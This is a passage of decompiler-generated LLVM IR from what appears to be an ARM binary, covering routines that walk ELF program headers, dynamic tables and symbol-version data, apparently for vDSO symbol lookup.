  %v1_167bc = phi i32 [ %v1_167bc.pre, %bb ], [ %v4_16824, %dec_label_pc_16824 ], [ -1, %dec_label_pc_167a8 ]
  %v2_167b8 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_167b8, i32* @r4, align 4
  ret i32 %v1_167bc

dec_label_pc_167c0:                               ; preds = %dec_label_pc_167a4
  %v1_167c0 = add i32 %arg1, 120
  %v2_167c0 = inttoptr i32 %v1_167c0 to i32*
  %v3_167c0 = load i32, i32* %v2_167c0, align 4
  %v3_167c4 = icmp ult i32 %v3_167c0, %v2_16784
  br i1 %v3_167c4, label %dec_label_pc_167cc, label %dec_label_pc_167a8

dec_label_pc_167cc:                               ; preds = %dec_label_pc_167c0, %dec_label_pc_16798, %dec_label_pc_1677c
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_167d0 = call i32 @function_16edc(i32 %arg1)
  store i32 %v1_167d0, i32* %r0.global-to-local, align 4
  %v1_167d4 = icmp slt i32 %v1_167d0, 0
  %v1_167ac.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v1_167d4, label %dec_label_pc_167a8, label %dec_label_pc_167dc

dec_label_pc_167dc:                               ; preds = %dec_label_pc_167cc
  %v1_167dc = add i32 %v1_167ac.pre, 112
  %v1_167e0 = inttoptr i32 %v1_167dc to i32*
  %v2_167e0 = load i32, i32* %v1_167e0, align 4
  %v3_167e0 = add i32 %v1_167ac.pre, 116
  %v4_167e0 = inttoptr i32 %v3_167e0 to i32*
  %v5_167e0 = load i32, i32* %v4_167e0, align 4
  store i32 %v5_167e0, i32* @r2, align 4
  %v2_167e4 = or i32 %v5_167e0, %v2_167e0
  %v4_167e4 = icmp eq i32 %v2_167e4, 0
  br i1 %v4_167e4, label %dec_label_pc_167ec, label %dec_label_pc_16834

dec_label_pc_167ec:                               ; preds = %dec_label_pc_167dc
  %v1_167ec = add i32 %v1_167ac.pre, 4
  %v2_167ec = inttoptr i32 %v1_167ec to i32*
  %v3_167ec = load i32, i32* %v2_167ec, align 4
  store i32 %v3_167ec, i32* %lr.global-to-local, align 4
  %v1_167f0 = add i32 %v1_167ac.pre, 8
  %v2_167f0 = inttoptr i32 %v1_167f0 to i32*
  %v3_167f0 = load i32, i32* %v2_167f0, align 4
  store i32 %v3_167f0, i32* @ip, align 4
  br label %dec_label_pc_167f4

dec_label_pc_167f4:                               ; preds = %dec_label_pc_1687c, %dec_label_pc_16878, %dec_label_pc_167ec
  %v0_167f4 = phi i32 [ %v3_16840, %dec_label_pc_16878 ], [ %v3_16840, %dec_label_pc_1687c ], [ %v3_167f0, %dec_label_pc_167ec ]
  %v2_167f4 = add i32 %v1_167ac.pre, 104
  %v3_167f4 = inttoptr i32 %v2_167f4 to i32*
  store i32 %v0_167f4, i32* %v3_167f4, align 4
  br label %dec_label_pc_167f8

dec_label_pc_167f8:                               ; preds = %dec_label_pc_16864, %dec_label_pc_167f4
  %v0_167f8 = load i32, i32* @ip, align 4
  %v2_167f8 = icmp eq i32 %v0_167f8, 0
  br i1 %v2_167f8, label %dec_label_pc_16824, label %dec_label_pc_16800

dec_label_pc_16800:                               ; preds = %dec_label_pc_167f8
  %v1_16800 = add i32 %v0_167f8, 1
  %v0_16804 = load i32, i32* %r5.global-to-local, align 4
  %v1_16804 = add i32 %v0_16804, 120
  %v1_16808 = inttoptr i32 %v1_16804 to i32*
  %v2_16808 = load i32, i32* %v1_16808, align 4
  %v3_16808 = add i32 %v0_16804, 124
  %v4_16808 = inttoptr i32 %v3_16808 to i32*
  %v5_16808 = load i32, i32* %v4_16808, align 4
  %v0_1680c = load i32, i32* %lr.global-to-local, align 4
  %v2_1680c = sub i32 %v1_16800, %v0_1680c
  %v3_16810 = ashr i32 %v2_1680c, 31
  %v2_16814 = add i32 %v2_1680c, %v2_16808
  %v3_16814 = icmp ult i32 %v2_16814, %v2_16808
  %v3_16818 = add i32 %v3_16810, %v5_16808
  %v4_16818 = zext i1 %v3_16814 to i32
  %v5_16818 = add i32 %v4_16818, %v3_16818
  store i32 %v5_16818, i32* @r2, align 4
  store i32 %v2_16814, i32* %v1_16808, align 4
  %v0_16820 = load i32, i32* @r2, align 4
  %v1_16820 = load i32, i32* %r5.global-to-local, align 4
  %v2_16820 = add i32 %v1_16820, 124
  %v3_16820 = inttoptr i32 %v2_16820 to i32*
  store i32 %v0_16820, i32* %v3_16820, align 4
  br label %dec_label_pc_16824

dec_label_pc_16824:                               ; preds = %dec_label_pc_167f8, %dec_label_pc_16800
  %v0_16824 = load i32, i32* %lr.global-to-local, align 4
  %v1_16824 = add i32 %v0_16824, -1
  %v2_16824 = inttoptr i32 %v1_16824 to i8*
  %v3_16824 = load i8, i8* %v2_16824, align 1
  %v4_16824 = zext i8 %v3_16824 to i32
  %v0_16828 = load i32, i32* %r0.global-to-local, align 4
  %v9_16828 = icmp eq i32 %v0_16828, %v4_16824
  br i1 %v9_16828, label %dec_label_pc_167b4, label %bb

bb:                                               ; preds = %dec_label_pc_16824
  %v2_1682c = trunc i32 %v0_16828 to i8
  store i8 %v2_1682c, i8* %v2_16824, align 1
  %v1_167bc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_167b4

dec_label_pc_16834:                               ; preds = %dec_label_pc_167dc
  %v1_16834 = add i32 %v1_167ac.pre, 120
  %v1_16838 = inttoptr i32 %v1_16834 to i32*
  %v2_16838 = load i32, i32* %v1_16838, align 4
  %v3_16838 = add i32 %v1_167ac.pre, 124
  %v4_16838 = inttoptr i32 %v3_16838 to i32*
  %v5_16838 = load i32, i32* %v4_16838, align 4
  %v1_1683c = add i32 %v1_167ac.pre, 4
  %v2_1683c = inttoptr i32 %v1_1683c to i32*
  %v3_1683c = load i32, i32* %v2_1683c, align 4
  store i32 %v3_1683c, i32* %lr.global-to-local, align 4
  %v1_16840 = add i32 %v1_167ac.pre, 8
  %v2_16840 = inttoptr i32 %v1_16840 to i32*
  %v3_16840 = load i32, i32* %v2_16840, align 4
  store i32 %v3_16840, i32* @ip, align 4
  %v1_16844 = sub i32 -1, %v2_16838
  %v2_16848 = add i32 %v2_167e0, %v1_16844
  %v3_16848 = icmp ult i32 %v2_16848, %v1_16844
  %v1_1684c = sub i32 -1, %v5_16838
  %v2_16850 = sub i32 %v3_16840, %v3_1683c
  %v3_16854 = add i32 %v5_167e0, %v1_1684c
  %v4_16854 = zext i1 %v3_16848 to i32
  %v5_16854 = add i32 %v3_16854, %v4_16854
  %v3_16858 = ashr i32 %v2_16850, 31
  %v7_16860 = icmp sgt i32 %v3_16858, %v5_16854
  br i1 %v7_16860, label %dec_label_pc_16864, label %dec_label_pc_16878

dec_label_pc_16864:                               ; preds = %dec_label_pc_1687c, %dec_label_pc_16834
  %v2_16864 = sub i32 %v2_167e0, %v2_16838
  store i32 %v2_16864, i32* @r2, align 4
  %v1_16868 = add i32 %v2_16864, -1
  %v2_1686c = add i32 %v1_16868, %v3_1683c
  %v2_16870 = add i32 %v1_167ac.pre, 104
  %v3_16870 = inttoptr i32 %v2_16870 to i32*
  store i32 %v2_1686c, i32* %v3_16870, align 4
  br label %dec_label_pc_167f8

dec_label_pc_16878:                               ; preds = %dec_label_pc_16834
  %v9_1685c = icmp eq i32 %v3_16858, %v5_16854
  br i1 %v9_1685c, label %dec_label_pc_1687c, label %dec_label_pc_167f4

dec_label_pc_1687c:                               ; preds = %dec_label_pc_16878
  %tmp = icmp ugt i32 %v2_16850, %v2_16848
  br i1 %tmp, label %dec_label_pc_16864, label %dec_label_pc_167f4

; uselistorder directives
  uselistorder i32 %v3_16858, { 1, 0 }
  uselistorder i32 %v3_16840, { 2, 3, 1, 0 }
  uselistorder i32 %v2_16838, { 1, 0 }
  uselistorder i32 %v4_16824, { 1, 0 }
  uselistorder i32 %v2_16808, { 1, 0 }
  uselistorder i32 %v2_167e0, { 2, 0, 1 }
  uselistorder i32 %v1_167ac.pre, { 9, 7, 8, 4, 3, 10, 5, 6, 2, 1, 0 }
  uselistorder i32 %v3_16798, { 1, 0 }
  uselistorder i32 %v5_16784, { 1, 2, 0, 3 }
  uselistorder i32 %v2_16784, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 31, { 14, 15, 16, 0, 17, 18, 24, 25, 21, 5, 6, 7, 8, 22, 9, 10, 23, 20, 19, 1, 2, 11, 3, 12, 4, 13 }
  uselistorder i32 104, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 0, 22, 2, 23, 1, 24 }
  uselistorder i32 124, { 0, 2, 1, 3, 4 }
  uselistorder i32 %arg1, { 3, 2, 6, 0, 1, 4, 5, 8, 7, 9 }
  uselistorder label %dec_label_pc_16824, { 1, 0 }
  uselistorder label %dec_label_pc_167a8, { 1, 0, 2 }
}

define i32 @function_16888() local_unnamed_addr {
dec_label_pc_16888:
  %stack_var_0 = alloca i32, align 4
  %v1_16888 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_16888, i32* @ip, align 4
  %v0_16894 = load i32, i32* @r1, align 4
  %v0_1689c = load i32, i32* @r3, align 4
  store i32 %v0_1689c, i32* @r2, align 4
  ret i32 %v0_16894
}

define i32 @function_168b8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_168b8:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_168bc = load i32, i32* @r4, align 4
  store i32 %v3_168bc, i32* %stack_var_-36, align 4
  %v3_168c0 = load i32, i32* @global_var_22aec.528, align 4
  %v1_168c4 = inttoptr i32 %v3_168c0 to i32*
  %v2_168c4 = load i32, i32* %v1_168c4, align 4
  %v7_168c8 = icmp eq i32 %v2_168c4, 33
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %v0_168d4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_168d4, i32* %r8.global-to-local, align 4
  br i1 %v7_168c8, label %.thread, label %dec_label_pc_168e0

.thread:                                          ; preds = %dec_label_pc_168b8
  %v1_168c8 = add i32 %v2_168c4, -33
  br label %dec_label_pc_1690c

dec_label_pc_168e0:                               ; preds = %dec_label_pc_168b8
  %v2_168e0 = icmp eq i32 %v2_168c4, 0
  br i1 %v2_168e0, label %dec_label_pc_16984, label %dec_label_pc_168f8.preheader

dec_label_pc_168f8.preheader:                     ; preds = %dec_label_pc_168e0
  store i32 8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_168f8

dec_label_pc_168f8:                               ; preds = %dec_label_pc_168f8, %dec_label_pc_168f8.preheader
  %v0_16904 = phi i32 [ 8, %dec_label_pc_168f8.preheader ], [ %v1_16904, %dec_label_pc_168f8 ]
  %v2_168fc = add i32 %v0_16904, %v3_168c0
  %v3_168fc = inttoptr i32 %v2_168fc to i32*
  %v4_168fc = load i32, i32* %v3_168fc, align 4
  %v1_16904 = add i32 %v0_16904, 8
  store i32 %v1_16904, i32* %r1.global-to-local, align 4
  switch i32 %v4_168fc, label %dec_label_pc_168f8 [
    i32 33, label %dec_label_pc_1690c.loopexit
    i32 0, label %dec_label_pc_16984.loopexit17
  ]

dec_label_pc_1690c.loopexit:                      ; preds = %dec_label_pc_168f8
  br label %dec_label_pc_1690c

dec_label_pc_1690c:                               ; preds = %.thread, %dec_label_pc_1690c.loopexit
  %v0_1690c = phi i32 [ %v0_16904, %dec_label_pc_1690c.loopexit ], [ %v1_168c8, %.thread ]
  %v2_1690c = add i32 %v0_1690c, %v3_168c0
  %v1_16910 = add i32 %v2_1690c, 4
  %v2_16910 = inttoptr i32 %v1_16910 to i32*
  %v3_16910 = load i32, i32* %v2_16910, align 4
  %v1_16914 = add i32 %v3_16910, 44
  %v2_16914 = inttoptr i32 %v1_16914 to i16*
  %v3_16914 = load i16, i16* %v2_16914, align 2
  %v4_16914 = zext i16 %v3_16914 to i32
  %v2_16918 = icmp eq i16 %v3_16914, 0
  br i1 %v2_16918, label %dec_label_pc_16984, label %dec_label_pc_16924

dec_label_pc_16924:                               ; preds = %dec_label_pc_1690c
  %v1_1691c = add i32 %v3_16910, 28
  %v2_1691c = inttoptr i32 %v1_1691c to i32*
  %v3_1691c = load i32, i32* %v2_1691c, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_16928 = add i32 %v3_16910, 42
  %v2_16928 = inttoptr i32 %v1_16928 to i16*
  %v3_16928 = load i16, i16* %v2_16928, align 2
  %v4_16928 = zext i16 %v3_16928 to i32
  %v2_1692c = add i32 %v3_1691c, %v3_16910
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16938

dec_label_pc_16938:                               ; preds = %.thread4, %dec_label_pc_16924
  %v1_1697038 = phi i32 [ %v0_169a0, %.thread4 ], [ 0, %dec_label_pc_16924 ]
  %v0_1696c36 = phi i32 [ %v0_1696c, %.thread4 ], [ -1, %dec_label_pc_16924 ]
  %v0_1695c = phi i32 [ %v1_1695c, %.thread4 ], [ 0, %dec_label_pc_16924 ]
  %v0_16964 = phi i32 [ %v2_16964, %.thread4 ], [ %v2_1692c, %dec_label_pc_16924 ]
  %v1_16938 = inttoptr i32 %v0_16964 to i32*
  %v2_16938 = load i32, i32* %v1_16938, align 4
  switch i32 %v2_16938, label %.thread4 [
    i32 1, label %.thread2
    i32 2, label %bb
  ]

.thread2:                                         ; preds = %dec_label_pc_16938
  %v2_16940 = add i32 %v0_16964, 4
  %v3_16940 = inttoptr i32 %v2_16940 to i32*
  %v4_16940 = load i32, i32* %v3_16940, align 4
  %v5_16940 = add i32 %v0_16964, 8
  %v6_16940 = inttoptr i32 %v5_16940 to i32*
  %v7_16940 = load i32, i32* %v6_16940, align 4
  %v3_16944 = sub i32 %v4_16940, %v7_16940
  %v3_16948 = add i32 %v3_16944, %v3_16910
  store i32 %v3_16948, i32* %r5.global-to-local, align 4
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_16938
  %v2_16954 = add i32 %v0_16964, 4
  %v3_16954 = inttoptr i32 %v2_16954 to i32*
  %v4_16954 = load i32, i32* %v3_16954, align 4
  %v3_16958 = add i32 %v4_16954, %v3_16910
  store i32 %v3_16958, i32* %r4.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16938, %.thread2, %bb
  %v0_169a0 = phi i32 [ %v1_1697038, %.thread2 ], [ %v3_16958, %bb ], [ %v1_1697038, %dec_label_pc_16938 ]
  %v0_1696c = phi i32 [ %v3_16948, %.thread2 ], [ %v0_1696c36, %bb ], [ %v0_1696c36, %dec_label_pc_16938 ]
  %v1_1695c = add i32 %v0_1695c, 1
  store i32 %v1_1695c, i32* %r1.global-to-local, align 4
  %v9_16960 = icmp eq i32 %v1_1695c, %v4_16914
  %v2_16964 = add i32 %v0_16964, %v4_16928
  br i1 %v9_16960, label %dec_label_pc_1696c, label %dec_label_pc_16938

dec_label_pc_1696c:                               ; preds = %.thread4
  %v7_1696c = icmp eq i32 %v0_1696c, -1
  br i1 %v7_1696c, label %.thread8, label %bb71

bb71:                                             ; preds = %dec_label_pc_1696c
  %v3_16970 = icmp eq i32 %v0_169a0, 0
  br i1 %v3_16970, label %bb72, label %dec_label_pc_16990

.thread8:                                         ; preds = %dec_label_pc_1696c
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16984

bb72:                                             ; preds = %bb71
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16984

dec_label_pc_16984.loopexit17:                    ; preds = %dec_label_pc_168f8
  br label %dec_label_pc_16984

dec_label_pc_16984:                               ; preds = %dec_label_pc_16a5c, %bb72, %bb80, %dec_label_pc_16984.loopexit17, %dec_label_pc_168e0, %.thread16, %.thread8, %dec_label_pc_1690c, %dec_label_pc_16990, %dec_label_pc_16a2c, %bb82, %dec_label_pc_16b34
  %storemerge = phi i32 [ %v2_16b38, %dec_label_pc_16b34 ], [ 0, %bb72 ], [ 0, %bb82 ], [ 0, %dec_label_pc_16a2c ], [ 0, %bb80 ], [ 0, %dec_label_pc_16990 ], [ 0, %dec_label_pc_1690c ], [ 0, %.thread8 ], [ 0, %.thread16 ], [ 0, %dec_label_pc_168e0 ], [ 0, %dec_label_pc_16984.loopexit17 ], [ 0, %dec_label_pc_16a5c ]
  %v2_16988 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_16988, i32* %r4.global-to-local, align 4
  ret i32 %storemerge

dec_label_pc_16990:                               ; preds = %bb71
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_16990 = inttoptr i32 %v0_169a0 to i32*
  %v2_16990 = load i32, i32* %v1_16990, align 4
  %v2_16994 = icmp eq i32 %v2_16990, 0
  br i1 %v2_16994, label %dec_label_pc_16984, label %dec_label_pc_1699c

dec_label_pc_1699c:                               ; preds = %dec_label_pc_16990
  store i32 0, i32* %r6.global-to-local, align 4
  %v1_169a0 = add i32 %v0_169a0, 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_169e4

dec_label_pc_169bc:                               ; preds = %dec_label_pc_169f8
  switch i32 %v0_16a0c, label %bb75 [
    i32 4, label %bb73
    i32 5, label %bb74
  ]

bb73:                                             ; preds = %dec_label_pc_169bc
  store i32 %v2_169ec, i32* %sl.global-to-local, align 4
  br label %bb75

bb74:                                             ; preds = %dec_label_pc_169bc
  store i32 %v2_169ec, i32* %r6.global-to-local, align 4
  br label %bb75

bb75:                                             ; preds = %dec_label_pc_169fc, %dec_label_pc_169bc, %bb76, %bb77, %bb73, %bb78, %bb74
  %v0_16a38 = phi i32 [ %v2_169ec, %bb78 ], [ %v0_16a3855, %bb77 ], [ %v0_16a3855, %bb73 ], [ %v0_16a3855, %bb76 ], [ %v0_16a3855, %bb74 ], [ %v0_16a3855, %dec_label_pc_169bc ], [ %v0_16a3855, %dec_label_pc_169fc ]
  %v0_16a40 = phi i32 [ %v0_16a2c53, %bb78 ], [ %v0_16a2c53, %bb77 ], [ %v2_169ec, %bb73 ], [ %v0_16a2c53, %bb76 ], [ %v0_16a2c53, %bb74 ], [ %v0_16a2c53, %dec_label_pc_169bc ], [ %v0_16a2c53, %dec_label_pc_169fc ]
  %v0_16a50 = phi i32 [ %v0_16a1848, %bb78 ], [ %v0_16a1848, %bb77 ], [ %v0_16a1848, %bb73 ], [ %v2_169ec, %bb76 ], [ %v0_16a1848, %bb74 ], [ %v0_16a1848, %dec_label_pc_169bc ], [ %v0_16a1848, %dec_label_pc_169fc ]
  %v1_16a1c = phi i32 [ %v1_16a1c50, %bb78 ], [ %v1_16a1c50, %bb77 ], [ %v1_16a1c50, %bb73 ], [ %v1_16a1c50, %bb76 ], [ %v2_169ec, %bb74 ], [ %v1_16a1c50, %dec_label_pc_169bc ], [ %v1_16a1c50, %dec_label_pc_169fc ]
  %v2_169d0 = add i32 %v0_169d8, %v0_169a0
  %v3_169d0 = inttoptr i32 %v2_169d0 to i32*
  %v4_169d0 = load i32, i32* %v3_169d0, align 4
  %v2_169d4 = icmp eq i32 %v4_169d0, 0
  %v1_169dc = add i32 %v0_169d8, 8
  br i1 %v2_169d4, label %dec_label_pc_16a18, label %dec_label_pc_169e4

dec_label_pc_169e4:                               ; preds = %bb75, %dec_label_pc_1699c
  %v0_16a3855 = phi i32 [ %v0_16a38, %bb75 ], [ 0, %dec_label_pc_1699c ]
  %v0_16a2c53 = phi i32 [ %v0_16a40, %bb75 ], [ 0, %dec_label_pc_1699c ]
  %v1_16a1c50 = phi i32 [ %v1_16a1c, %bb75 ], [ 0, %dec_label_pc_1699c ]
  %v0_16a1848 = phi i32 [ %v0_16a50, %bb75 ], [ 0, %dec_label_pc_1699c ]
  %v0_169e4 = phi i32 [ %v0_169d8, %bb75 ], [ 0, %dec_label_pc_1699c ]
  %v0_169d8 = phi i32 [ %v1_169dc, %bb75 ], [ 8, %dec_label_pc_1699c ]
  %v0_16a0c = phi i32 [ %v4_169d0, %bb75 ], [ %v2_16990, %dec_label_pc_1699c ]
  %v2_169e4 = add i32 %v0_169e4, %v1_169a0
  %v3_169e4 = inttoptr i32 %v2_169e4 to i32*
  %v4_169e4 = load i32, i32* %v3_169e4, align 4
  %v7_169e8 = icmp eq i32 %v0_16a0c, 6
  %v2_169ec = add i32 %v4_169e4, %v0_1696c
  br i1 %v7_169e8, label %bb76, label %dec_label_pc_169f8

bb76:                                             ; preds = %dec_label_pc_169e4
  store i32 %v2_169ec, i32* %r1.global-to-local, align 4
  br label %bb75

dec_label_pc_169f8:                               ; preds = %dec_label_pc_169e4
  %v2_169e8 = icmp ugt i32 %v0_16a0c, 5
  br i1 %v2_169e8, label %dec_label_pc_169fc, label %dec_label_pc_169bc

dec_label_pc_169fc:                               ; preds = %dec_label_pc_169f8
  switch i32 %v0_16a0c, label %bb75 [
    i32 1879048176, label %bb77
    i32 1879048188, label %bb78
  ]

bb77:                                             ; preds = %dec_label_pc_169fc
  store i32 %v2_169ec, i32* %fp.global-to-local, align 4
  br label %bb75

bb78:                                             ; preds = %dec_label_pc_169fc
  store i32 %v2_169ec, i32* %sb.global-to-local, align 4
  br label %bb75

dec_label_pc_16a18:                               ; preds = %bb75
  %v2_16a18 = icmp eq i32 %v0_16a50, 0
  br i1 %v2_16a18, label %.thread16, label %bb79

bb79:                                             ; preds = %dec_label_pc_16a18
  %v3_16a1c = icmp eq i32 %v1_16a1c, 0
  br i1 %v3_16a1c, label %bb80, label %dec_label_pc_16a2c

.thread16:                                        ; preds = %dec_label_pc_16a18
  br label %dec_label_pc_16984

bb80:                                             ; preds = %bb79
  br label %dec_label_pc_16984

dec_label_pc_16a2c:                               ; preds = %bb79
  %v2_16a2c = icmp eq i32 %v0_16a40, 0
  br i1 %v2_16a2c, label %dec_label_pc_16984, label %dec_label_pc_16a34

dec_label_pc_16a34:                               ; preds = %dec_label_pc_16a2c
  %v1_16a34 = add i32 %v0_16a40, 4
  %v2_16a34 = inttoptr i32 %v1_16a34 to i32*
  %v3_16a34 = load i32, i32* %v2_16a34, align 4
  %v2_16a38 = icmp eq i32 %v0_16a38, 0
  br i1 %v2_16a38, label %bb81, label %bb82

bb81:                                             ; preds = %dec_label_pc_16a34
  store i32 0, i32* %fp.global-to-local, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_16a34, %bb81
  store i32 %v1_16a34, i32* %sl.global-to-local, align 4
  %v2_16a44 = icmp eq i32 %v3_16a34, 0
  br i1 %v2_16a44, label %dec_label_pc_16984, label %dec_label_pc_16a50

dec_label_pc_16a50:                               ; preds = %bb82
  store i32 %v0_16a50, i32* %r4.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_16a74

dec_label_pc_16a5c.loopexit:                      ; preds = %dec_label_pc_16ae8
  br label %dec_label_pc_16a5c

dec_label_pc_16a5c:                               ; preds = %dec_label_pc_16a5c.loopexit, %dec_label_pc_16b18, %dec_label_pc_16ab0, %dec_label_pc_16aa4, %dec_label_pc_16a8c, %dec_label_pc_16a74
  %v2_16a60 = load i32, i32* %v2_16a34, align 4
  %v0_16a64 = load i32, i32* %sl.global-to-local, align 4
  %v1_16a64 = add i32 %v0_16a64, 1
  store i32 %v1_16a64, i32* %sl.global-to-local, align 4
  %v0_16a6c = load i32, i32* %r4.global-to-local, align 4
  %v1_16a6c = add i32 %v0_16a6c, 16
  store i32 %v1_16a6c, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v2_16a60, %v1_16a64
  br i1 %tmp, label %dec_label_pc_16a74, label %dec_label_pc_16984

dec_label_pc_16a74:                               ; preds = %dec_label_pc_16a5c, %dec_label_pc_16a50
  %v0_16ab0 = phi i32 [ %v1_16a6c, %dec_label_pc_16a5c ], [ %v0_16a50, %dec_label_pc_16a50 ]
  %v1_16a74 = add i32 %v0_16ab0, 12
  %v2_16a74 = inttoptr i32 %v1_16a74 to i8*
  %v3_16a74 = load i8, i8* %v2_16a74, align 1
  %v4_16a74 = zext i8 %v3_16a74 to i32
  store i32 %v4_16a74, i32* %r1.global-to-local, align 4
  %tmp87 = urem i8 %v3_16a74, 16
  %v1_16a7c = zext i8 %tmp87 to i32
  %v6_16a80 = lshr i32 39, %v1_16a7c
  %v1_16a84 = urem i32 %v6_16a80, 2
  %v2_16a84 = icmp eq i32 %v1_16a84, 0
  br i1 %v2_16a84, label %dec_label_pc_16a5c, label %dec_label_pc_16a8c

dec_label_pc_16a8c:                               ; preds = %dec_label_pc_16a74
  %div = udiv i8 %v3_16a74, 16
  %v3_16a90 = zext i8 %div to i32
  %v6_16a98 = lshr i32 1030, %v3_16a90
  %v1_16a9c = urem i32 %v6_16a98, 2
  %v2_16a9c = icmp eq i32 %v1_16a9c, 0
  br i1 %v2_16a9c, label %dec_label_pc_16a5c, label %dec_label_pc_16aa4

dec_label_pc_16aa4:                               ; preds = %dec_label_pc_16a8c
  %v1_16aa4 = add i32 %v0_16ab0, 14
  %v2_16aa4 = inttoptr i32 %v1_16aa4 to i16*
  %v3_16aa4 = load i16, i16* %v2_16aa4, align 2
  %v2_16aa8 = icmp eq i16 %v3_16aa4, 0
  br i1 %v2_16aa8, label %dec_label_pc_16a5c, label %dec_label_pc_16ab0

dec_label_pc_16ab0:                               ; preds = %dec_label_pc_16aa4
  %v4_16aa4 = zext i16 %v3_16aa4 to i32
  %v1_16ab0 = inttoptr i32 %v0_16ab0 to i32*
  %v2_16ab0 = load i32, i32* %v1_16ab0, align 4
  %v0_16ab4 = load i32, i32* %r8.global-to-local, align 4
  %v0_16ab8 = load i32, i32* %r6.global-to-local, align 4
  %v2_16ab8 = add i32 %v0_16ab8, %v2_16ab0
  store i32 %v2_16ab8, i32* %r1.global-to-local, align 4
  %v4_16abc = inttoptr i32 %v0_16ab4 to i8*
  %v5_16abc = call i32 @function_16f28(i8* %v4_16abc, i32 %v2_16ab8, i32 %v3_16a90, i32 %v4_16aa4)
  %v2_16ac0 = icmp eq i32 %v5_16abc, 0
  br i1 %v2_16ac0, label %dec_label_pc_16ac8, label %dec_label_pc_16a5c

dec_label_pc_16ac8:                               ; preds = %dec_label_pc_16ab0
  %v0_16ac8 = load i32, i32* %fp.global-to-local, align 4
  %v2_16ac8 = icmp eq i32 %v0_16ac8, 0
  br i1 %v2_16ac8, label %dec_label_pc_16b34, label %dec_label_pc_16ad0

dec_label_pc_16ad0:                               ; preds = %dec_label_pc_16ac8
  %v0_16ad0 = load i32, i32* %sl.global-to-local, align 4
  %v2_16ad0 = mul i32 %v0_16ad0, 2
  %v2_16ad4 = add i32 %v2_16ad0, %v0_16ac8
  %v3_16ad4 = inttoptr i32 %v2_16ad4 to i16*
  %v4_16ad4 = load i16, i16* %v3_16ad4, align 2
  %tmp88 = urem i16 %v4_16ad4, -32768
  %v3_16adc = zext i16 %tmp88 to i32
  %v0_16ae0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_16ae0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16af8

dec_label_pc_16ae8:                               ; preds = %dec_label_pc_16b04, %dec_label_pc_16af8
  %v1_16ae8 = add i32 %v0_16b18, 16
  %v2_16ae8 = inttoptr i32 %v1_16ae8 to i32*
  %v3_16ae8 = load i32, i32* %v2_16ae8, align 4
  %v2_16aec = icmp eq i32 %v3_16ae8, 0
  %v2_16af0 = add i32 %v3_16ae8, %v0_16b18
  store i32 %v2_16af0, i32* %r1.global-to-local, align 4
  br i1 %v2_16aec, label %dec_label_pc_16a5c.loopexit, label %dec_label_pc_16af8

dec_label_pc_16af8:                               ; preds = %dec_label_pc_16ae8, %dec_label_pc_16ad0
  %v0_16b18 = phi i32 [ %v2_16af0, %dec_label_pc_16ae8 ], [ %v0_16ae0, %dec_label_pc_16ad0 ]
  %v1_16af8 = add i32 %v0_16b18, 2
  %v2_16af8 = inttoptr i32 %v1_16af8 to i16*
  %v3_16af8 = load i16, i16* %v2_16af8, align 2
  %tmp89 = urem i16 %v3_16af8, 2
  %v2_16afc = icmp eq i16 %tmp89, 0
  br i1 %v2_16afc, label %dec_label_pc_16b04, label %dec_label_pc_16ae8

dec_label_pc_16b04:                               ; preds = %dec_label_pc_16af8
  %v1_16b04 = add i32 %v0_16b18, 4
  %v2_16b04 = inttoptr i32 %v1_16b04 to i16*
  %v3_16b04 = load i16, i16* %v2_16b04, align 2
  %tmp90 = urem i16 %v3_16b04, -32768
  %v9_16b10 = icmp eq i16 %tmp90, %tmp88
  br i1 %v9_16b10, label %dec_label_pc_16b18, label %dec_label_pc_16ae8

dec_label_pc_16b18:                               ; preds = %dec_label_pc_16b04
  %v1_16b18 = add i32 %v0_16b18, 12
  %v2_16b18 = inttoptr i32 %v1_16b18 to i32*
  %v3_16b18 = load i32, i32* %v2_16b18, align 4
  %v2_16b1c = add i32 %v3_16b18, %v0_16b18
  %v3_16b1c = inttoptr i32 %v2_16b1c to i32*
  %v4_16b1c = load i32, i32* %v3_16b1c, align 4
  %v0_16b20 = load i32, i32* %r7.global-to-local, align 4
  %v0_16b24 = load i32, i32* %r6.global-to-local, align 4
  %v2_16b24 = add i32 %v0_16b24, %v4_16b1c
  store i32 %v2_16b24, i32* %r1.global-to-local, align 4
